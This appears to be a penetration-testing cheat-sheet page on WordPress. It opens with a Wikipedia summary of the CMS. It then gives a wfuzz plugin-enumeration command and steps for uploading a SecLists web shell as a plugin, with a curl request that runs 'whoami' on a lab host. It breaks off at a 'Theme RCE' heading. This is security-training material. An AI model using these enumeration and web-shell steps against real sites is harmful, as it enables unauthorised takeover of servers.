# WordPress

## WordPress CMS

**WordPress** \(**WP**, **WordPress.org**\) is a [free and open-source](https://en.wikipedia.org/wiki/Free_and_open-source_software) [content management system](https://en.wikipedia.org/wiki/Content_management_system) \(CMS\) written in [PHP](https://en.wikipedia.org/wiki/PHP)[\[4\]](https://en.wikipedia.org/wiki/WordPress#cite_note-4) and paired with a [MySQL](https://en.wikipedia.org/wiki/MySQL) or [MariaDB](https://en.wikipedia.org/wiki/MariaDB) database. Features include a [plugin architecture](https://en.wikipedia.org/wiki/Plug-in_%28computing%29) and a [template system](https://en.wikipedia.org/wiki/Web_template_system), referred to within WordPress as Themes. WordPress was originally created as a [blog-publishing system](https://en.wikipedia.org/wiki/Blog) but has evolved to support other web content types including more traditional [mailing lists](https://en.wikipedia.org/wiki/Electronic_mailing_list) and [forums](https://en.wikipedia.org/wiki/Internet_forum), media galleries, membership sites, [learning management systems](https://en.wikipedia.org/wiki/Learning_management_system) \(LMS\) and [online stores](https://en.wikipedia.org/wiki/Shopping_cart_software). WordPress is used by 41.4% of the top 10 million websites as of May 2021,[\[5\]](https://en.wikipedia.org/wiki/WordPress#cite_note-Usage_of_content_management_systems_for_websites-5) WordPress is one of the most popular content management system solutions in use.[\[6\]](https://en.wikipedia.org/wiki/WordPress#cite_note-6) WordPress has also been used for other application domains, such as [pervasive display systems](https://en.wikipedia.org/wiki/Pervasive_display_systems) \(PDS\).[\[7\]](https://en.wikipedia.org/wiki/WordPress#cite_note-7)

The text above was extracted from [Wikipedia](https://en.wikipedia.org/wiki/WordPress).

## Enumerating WordPress

### Enumerating Plugins

SecLists has a good wordlist for fuzzing for plugins called `wp-plugins.fuzz.txt`

```text
wfuzz -c -t 200 --hc=404 -w wp-plugins.fuzz.txt http://10.10.10.88/webservices/wp/FUZZ
```

## Attacking WordPress

### Plugins WebShell

First, find a webshell and compress it into a zip file:

```text
kali@kali:~$ cd /usr/share/seclists/Web-Shells/WordPress
kali@kali:/usr/share/seclists/Web-Shells/WordPress$ sudo zip plugin-shell.zip plugin-shell.php
adding: plugin-shell.php (deflated 58%)
```

Then follow this steps:

Plugins -&gt; Add New -&gt; Upload Plugin -&gt; Browse -&gt; plugin-shell.zip -&gt; Open -&gt; Install Now -&gt;

After installing the plugins, visit the uploaded and installed plugin directory/file and execute it via the browser, burp, curl or anything similar:

```text
kali@kali:~$ curl http://10.10.10.10/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
www-data
```

### Theme RCE

WordPress &gt; Appearance &gt; Theme Editor &gt; Theme Header

